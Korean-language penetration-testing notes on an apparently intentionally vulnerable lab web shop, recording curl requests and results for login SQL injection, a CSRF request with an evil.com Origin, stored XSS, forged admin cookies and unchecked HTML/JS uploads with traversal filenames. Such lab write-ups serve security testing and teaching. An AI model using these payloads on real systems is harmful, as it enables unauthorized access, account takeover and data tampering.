# 2025-12-11 모의해킹 노트

## 기본 설정
- TARGET: http://172.20.10.2:3000
- MY_IP: 10.0.0.102, 모든 요청에 `X-Forwarded-For: 10.0.0.102` 적용
- 신규 계정 생성: tester / test, 로그인 쿠키 `/tmp/vulnshop.cookies` 확보

## 초기 탐색
- `/`에서 상품 목록과 SEC v1 표시 확인
- `/board` Q&A 게시판, 글쓰기 폼 존재
- `/login`, `/signup` 기본 로그인/가입 폼
- 로그인 후 `/profile`(프로필 이미지 업로드), `/order`(주문 조회) 메뉴 노출

## 취약점 검증
- 로그인 SQL Injection으로 관리자 계정 인증 우회
  - 요청: `curl -i -c /tmp/vulnshop.sqli -H "X-Forwarded-For: 10.0.0.102" -d "username=admin' OR '1'='1&password=anything" http://172.20.10.2:3000/login`
  - 결과: `Set-Cookie: user=admin; user_id=1` 쿠키가 발급되고 `/`로 리다이렉트 → 비밀번호 무시, SQLi로 인증 우회 가능
- 관리자 기능 CSRF 토큰 부재
  - 요청: `curl -i -H "X-Forwarded-For: 10.0.0.102" -H "Origin: http://evil.com" -b "user=admin; isAdmin=true; user_id=1" -d "name=OVERSIZED HOODIE&price=777&description=Heavyweight cotton fleece." http://172.20.10.2:3000/admin/products/1`
  - 결과: 302 `/admin/products` 리다이렉트 후 가격이 777로 반영됨(이후 120으로 복구) → Origin 검증·토큰 없음, 관리자 세션 탈취 시 CSRF로 임의 변경 가능
- 게시판 Stored XSS
  - 요청: `curl -i -b /tmp/vulnshop.cookies -H "X-Forwarded-For: 10.0.0.102" --data-urlencode "content=<script>alert('xss')</script>" http://172.20.10.2:3000/board`
  - 결과: `/board` 응답에서 `<script>alert('xss')</script>`가 그대로 렌더링되어 실행 가능
- 쿠키 변조로 관리자 권한 획득
  - 요청: `curl -i -H "X-Forwarded-For: 10.0.0.102" -b "user=admin; isAdmin=true; user_id=1" http://172.20.10.2:3000/admin/users`
  - 결과: 관리자 메뉴 및 사용자 관리 페이지 표시(사용자 삭제 버튼 포함) → 인증 우회
- 프로필 업로드 검증 부재
  - 요청: `curl -i -b /tmp/vulnshop.cookies -H "X-Forwarded-For: 10.0.0.102" -F "profile_image=@script/payload.html;type=text/html" http://172.20.10.2:3000/profile/upload`
  - 확인: `curl -i -H "X-Forwarded-For: 10.0.0.102" http://172.20.10.2:3000/uploads/payload.html` → `Content-Type: text/html`로 서빙되며 JS 실행 가능
  - 추가: `payload.js`(application/javascript) 업로드 시 `/uploads/payload.js`가 `Content-Type: text/javascript`로 노출되어 외부 스크립트 호스팅 가능
  - 파일명에 `../../` 포함 시 `/uploads/traversal.html`로 정규화되어 웹루트에 저장/노출됨(디렉터리 탈출은 불가하지만 파일명 제어 가능)
